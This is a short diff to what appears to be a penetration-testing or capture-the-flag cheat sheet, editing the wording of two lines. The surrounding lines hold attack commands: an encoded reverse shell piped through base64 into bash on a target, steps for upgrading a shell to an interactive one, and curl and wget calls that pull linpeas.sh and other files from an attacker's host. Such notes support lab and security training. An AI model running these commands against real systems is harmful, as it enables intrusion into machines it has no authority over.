@@ -39,7 +39,7 @@ inject encoded rs on target: `echo -n [ENCODED REVERSE SHELL] | base64 -d | bash
 
 ## INTERACTIVE SHELL
 target: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, hit <kbd>CTRL</kbd> + <kbd>z</kbd>\
-attacker: `stty raw -echo`, `fg`, hit <kbd>Enter</kbd>, <kbd>Enter</kbd>
+attacker: `stty raw -echo; fg`, hit <kbd>Enter</kbd>, <kbd>Enter</kbd>
 ### optional
 target: `export TERM=xterm`\
 attacker: `stty -a` shows rows `r` and collumns `c`\
@@ -72,7 +72,7 @@ curl IPADRESSSENDER:8083/FILE.NAME
 curl 10.10.IP.IP:8083/linpeas.sh > lp.sh
 wget IPADRESSSENDER:8083/FILE.NAME
 ```
-if curl is not installed make your own!
+if curl is not installed, make your own!
 ```bash
 $ function __curl() {
 read proto server path <<<$(echo ${1//// })
